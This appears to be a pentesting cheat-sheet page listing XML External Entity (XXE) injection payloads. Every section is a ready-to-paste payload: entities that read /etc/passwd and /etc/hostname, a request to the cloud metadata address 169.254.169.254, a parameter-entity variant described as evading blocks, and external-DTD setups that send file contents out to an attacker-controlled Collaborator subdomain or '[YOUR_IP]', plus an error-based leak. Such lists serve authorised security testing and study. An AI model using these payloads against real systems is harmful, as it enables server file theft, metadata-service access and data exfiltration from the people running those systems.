---
title: "XXE - XML External Entity"
draft: false
images: []
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

### CUSTOM ENTITY
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
### EXTERNAL ENTITY
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
### PARAMETER ENTITY
Evading block request containing regular entities
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>
```
### RETRIEVE DATA WITH EXTERNAL DTD
```
----- EXPLOIT SERVER -----

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;

----- VICTIM SERVER -----

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
### RETRIEVE DATA VIA ERROR
```
----- EXPLOIT SERVER -----

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

----- VICTIM SERVER -----

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
### Out of band
```
<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY >
<!ENTITY % dtd SYSTEM "http://[YOUR_IP]/payload.dtd"> %dtd;]>
<thp><error>%26send%3B</error></thp>
```